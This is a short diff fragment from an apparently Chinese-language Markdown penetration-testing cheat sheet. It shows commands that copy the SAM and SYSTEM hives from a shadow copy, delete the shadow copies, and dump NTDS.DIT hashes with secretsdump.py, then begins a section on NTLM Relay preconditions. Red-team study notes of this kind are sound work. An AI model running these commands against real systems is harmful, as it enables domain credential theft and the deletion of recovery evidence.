@@ -72,7 +72,7 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\SYSTEM #提取SYSTEM文件
 vssadmin Delete Shadows /For=C: /quiet #删除卷影
 python3 secretsdump.py -ntds NTDS -system SYSTEM LOCAL #提取NTDS.DIT中的哈希
-
+```
 
 ## 0x11 NTLM Relay
 NTLM Relay攻击能成功的前提是NTLM镶嵌的协议没有开启签名，默认情况下SMB签名只在域控机器上要求，而域内机器不要求。默认情况下LDAP签名通过协商决定，即客户端可控。
